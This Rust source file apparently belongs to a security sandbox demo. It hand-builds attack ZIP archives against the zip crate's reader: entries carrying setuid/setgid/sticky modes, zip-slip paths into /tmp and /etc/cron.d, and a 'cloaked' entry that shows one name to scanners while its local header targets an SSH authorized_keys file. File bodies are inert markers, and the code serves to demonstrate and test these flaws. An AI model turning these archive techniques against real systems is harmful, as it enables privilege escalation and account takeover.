//! Crafted attack archives served by the `web` component.
//!
//! These are hand-assembled ZIP bytes. The central-directory
//! `external_attributes` carry hostile Unix modes (setuid/setgid/sticky)
//! verbatim; some entry names are zip-slip paths; and a cloaked entry carries a
//! different name in its local header than in the central directory. The file
//! BODIES are inert text — only the metadata and names are hostile. We emit the
//! bytes ourselves because the `zip` crate's *writer* masks setuid with `& 0o777`
//! and never cloaks; only the *reader* is vulnerable (RUSTSEC-2026-0367 for the
//! modes, CVE-2026-115905 for the cloak), which is the asymmetry under test.
//!
//! Four crafted archives, one per attack button:
//!   - `craft_suid_zip`      — Bug 1: three setuid/setgid/sticky entries.
//!   - `craft_zipslip_zip`   — Bug 2: three path-traversal (zip-slip) entries.
//!   - `craft_cloak_zip`     — Bug 3: one cloaked entry (CVE-2026-115905).
//!   - `craft_combined_zip`  — Bug 4: every attack above in a single archive.

const MARKER_BODY: &[u8] = b"inert marker file for the zip-crate sandbox demo\n";
const CLOAK_BODY: &[u8] = b"inert marker: on a vulnerable host this would silently drop an attacker SSH key\n";

/// The cloaked entry's two faces: a benign name a scanner sees in the central
/// directory, and the real path a streaming extractor honors from the local
/// header (an SSH authorized_keys drop — account takeover on a vulnerable host).
const CLOAK_CENTRAL: &str = "release-notes.txt";
const CLOAK_LOCAL: &str = "home/you/.ssh/authorized_keys";

/// One archive entry. `central_name` is what the central directory advertises
/// (what a scanner / `ZipArchive` sees); `local_name` is what the local file
/// header carries (what a streaming extractor honors). They are identical for an
/// honest entry and differ only for a cloaked one (CVE-2026-115905).
struct Entry<'a> {
    local_name: &'a str,
    central_name: &'a str,
    data: &'a [u8],
    mode: u32,
}

impl<'a> Entry<'a> {
    /// An honest entry: the local and central names match.
    fn plain(name: &'a str, mode: u32) -> Self {
        Entry { local_name: name, central_name: name, data: MARKER_BODY, mode }
    }

    /// A cloaked entry (CVE-2026-115905): the central directory advertises
    /// `central` while the local header carries `local`.
    fn cloaked(local: &'a str, central: &'a str, data: &'a [u8]) -> Self {
        Entry { local_name: local, central_name: central, data, mode: 0o100644 }
    }
}

/// Assemble a stored/uncompressed ZIP from the given entries. Each entry's local
/// header carries `local_name` + `mode`; its central-directory record carries
/// `central_name` + `mode`. Cloaked entries are the only ones where the two
/// names differ.
fn build_archive(entries: &[Entry]) -> Vec<u8> {
    let mut buf: Vec<u8> = Vec::new();
    let mut directory: Vec<u8> = Vec::new();
    let mut count: u16 = 0;

    for e in entries {
        let ln = e.local_name.as_bytes();
        let cn = e.central_name.as_bytes();
        let crc = crc32(e.data);
        let size = e.data.len() as u32;
        let local_offset = buf.len() as u32;

        // ---- Local file header (the name a streaming extractor honors) ----
        buf.extend_from_slice(&0x0403_4b50u32.to_le_bytes());
        buf.extend_from_slice(&20u16.to_le_bytes());
        buf.extend_from_slice(&0u16.to_le_bytes());
        buf.extend_from_slice(&0u16.to_le_bytes()); // stored
        buf.extend_from_slice(&0u16.to_le_bytes());
        buf.extend_from_slice(&0u16.to_le_bytes());
        buf.extend_from_slice(&crc.to_le_bytes());
        buf.extend_from_slice(&size.to_le_bytes());
        buf.extend_from_slice(&size.to_le_bytes());
        buf.extend_from_slice(&(ln.len() as u16).to_le_bytes());
        buf.extend_from_slice(&0u16.to_le_bytes());
        buf.extend_from_slice(ln);
        buf.extend_from_slice(e.data);

        // ---- Central directory header (the name a scanner sees + the mode) ----
        directory.extend_from_slice(&0x0201_4b50u32.to_le_bytes());
        directory.extend_from_slice(&0x031eu16.to_le_bytes()); // version made by: Unix host
        directory.extend_from_slice(&20u16.to_le_bytes());
        directory.extend_from_slice(&0u16.to_le_bytes());
        directory.extend_from_slice(&0u16.to_le_bytes());
        directory.extend_from_slice(&0u16.to_le_bytes());
        directory.extend_from_slice(&0u16.to_le_bytes());
        directory.extend_from_slice(&crc.to_le_bytes());
        directory.extend_from_slice(&size.to_le_bytes());
        directory.extend_from_slice(&size.to_le_bytes());
        directory.extend_from_slice(&(cn.len() as u16).to_le_bytes());
        directory.extend_from_slice(&0u16.to_le_bytes());
        directory.extend_from_slice(&0u16.to_le_bytes());
        directory.extend_from_slice(&0u16.to_le_bytes());
        directory.extend_from_slice(&0u16.to_le_bytes());
        directory.extend_from_slice(&(e.mode << 16).to_le_bytes()); // external attrs
        directory.extend_from_slice(&local_offset.to_le_bytes());
        directory.extend_from_slice(cn);

        count += 1;
    }

    let cd_offset = buf.len() as u32;
    let cd_size = directory.len() as u32;
    buf.extend_from_slice(&directory);

    // ---- End of central directory ----
    buf.extend_from_slice(&0x0605_4b50u32.to_le_bytes());
    buf.extend_from_slice(&0u16.to_le_bytes());
    buf.extend_from_slice(&0u16.to_le_bytes());
    buf.extend_from_slice(&count.to_le_bytes());
    buf.extend_from_slice(&count.to_le_bytes());
    buf.extend_from_slice(&cd_size.to_le_bytes());
    buf.extend_from_slice(&cd_offset.to_le_bytes());
    buf.extend_from_slice(&0u16.to_le_bytes());
    buf
}

/// The three privileged-bit entries (setuid / setgid / sticky). Shared by Bug 1
/// and the combined run.
fn suid_entries() -> [Entry<'static>; 3] {
    [
        Entry::plain("suid-helper", 0o104755),
        Entry::plain("sgid-helper", 0o102755),
        Entry::plain("sticky-helper", 0o101755),
    ]
}

/// The three zip-slip / path-traversal entries. Every name contains a `..`
/// component, so a correct extractor refuses all three. Shared by Bug 2 and the
/// combined run.
fn zipslip_entries() -> [Entry<'static>; 3] {
    [
        Entry::plain("../../../../../../tmp/zip-slip-parent", 0o100644),
        Entry::plain("../../../../../../etc/cron.d/zip-slip-cron", 0o100644),
        Entry::plain("stuff/../../../../../../tmp/zip-slip-nested", 0o100644),
    ]
}

/// Bug 1 (RUSTSEC-2026-0367): three entries carrying setuid / setgid / sticky.
pub fn craft_suid_zip() -> Vec<u8> {
    build_archive(&suid_entries())
}

/// Bug 2 (zip-slip / path traversal): three entries whose names try to escape
/// the extraction tree.
pub fn craft_zipslip_zip() -> Vec<u8> {
    build_archive(&zipslip_entries())
}

/// Bug 3 (CVE-2026-115905, zip cloaking): a single cloaked entry. A scanner
/// reading the central directory sees `release-notes.txt`; a streaming extractor
/// honors the local-header name `home/you/.ssh/authorized_keys`. Inert body.
pub fn craft_cloak_zip() -> Vec<u8> {
    build_archive(&[Entry::cloaked(CLOAK_LOCAL, CLOAK_CENTRAL, CLOAK_BODY)])
}

/// Bug 4 (run all): every attack in one malicious archive — the three
/// privileged-bit entries, the three zip-slip paths, and the cloaked entry.
/// Seven entries total.
pub fn craft_combined_zip() -> Vec<u8> {
    let mut all: Vec<Entry> = Vec::new();
    all.extend(suid_entries());
    all.extend(zipslip_entries());
    all.push(Entry::cloaked(CLOAK_LOCAL, CLOAK_CENTRAL, CLOAK_BODY));
    build_archive(&all)
}

/// Minimal CRC-32 (IEEE), so building the fixtures needs no extra crate.
fn crc32(data: &[u8]) -> u32 {
    let mut crc: u32 = 0xFFFF_FFFF;
    for &b in data {
        crc ^= b as u32;
        for _ in 0..8 {
            let mask = (crc & 1).wrapping_neg();
            crc = (crc >> 1) ^ (0xEDB8_8320 & mask);
        }
    }
    !crc
}
